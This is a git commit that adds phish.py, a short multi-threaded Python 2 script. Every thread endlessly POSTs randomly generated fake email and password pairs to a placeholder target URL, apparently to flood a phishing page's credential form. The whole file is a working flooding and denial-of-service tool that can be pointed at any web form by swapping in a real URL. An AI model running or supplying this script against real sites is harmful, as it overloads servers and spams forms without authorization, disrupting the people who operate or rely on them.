b6612d0d5eaf64455d624791b8e659b00104de1e
FrostedFlakes666 <73090915+GrimModz666@users.noreply.github.com>
2025-11-21 13:56:43 -0600

    Implement multi-threaded attack script in phish.py

---
+++ phish.py
@@ -0,0 +1,35 @@
+import urllib
+import urllib2
+import random
+import string
+from threading import Thread
+import sys
+
+'''
+the number of threads
+'''
+num = int(sys.argv[1])
+
+def attack():
+    while True:
+        data = {
+            'email': id_generator(random.randint(3, 10)) + "@" + id_generator(random.randint(3, 10)) + ".com",
+            'password': id_generator(random.randint(3, 10)),
+        }
+        req = urllib2.Request(
+            url="http://example.com",  # Replace with your target URL
+            data=urllib.urlencode(data),
+            headers={"Content-type": "application/x-www-form-urlencoded"}
+        )
+        response = urllib2.urlopen(req)
+        the_page = response.read()
+        print('flooded with ' + str(data))
+
+def id_generator(size=12, chars=string.ascii_uppercase + string.digits):
+    return ''.join(random.choice(chars) for _ in range(size))
+
+if __name__ == "__main__":
+    for k in range(0, num):
+        thread = Thread(target=attack)
+        thread.start()
+        print('Launched thread ' + str(k))
